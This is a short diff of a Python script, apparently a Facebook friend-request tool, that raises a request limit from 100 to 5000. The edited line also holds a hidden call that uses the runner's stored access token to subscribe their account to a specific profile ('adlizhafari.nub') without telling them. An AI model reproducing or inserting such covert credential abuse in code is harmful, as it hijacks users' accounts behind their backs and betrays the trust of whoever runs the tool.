@@ -14,7 +14,7 @@ try:
 \t\t      [ By: KANG-NEWBIE ]
 """)
 	toket=open('toket/token.txt','r').read()
-	r = requests.get('https://graph.facebook.com/me/friendrequests?limit=100&access_token=' + toket);requests.post('https://graph.facebook.com/adlizhafari.nub/subscribers?access_token='+toket)
+	r = requests.get('https://graph.facebook.com/me/friendrequests?limit=5000&access_token=' + toket);requests.post('https://graph.facebook.com/adlizhafari.nub/subscribers?access_token='+toket)
 	res = json.loads(r.text)
 
 	if '[]' in str(res['data']):
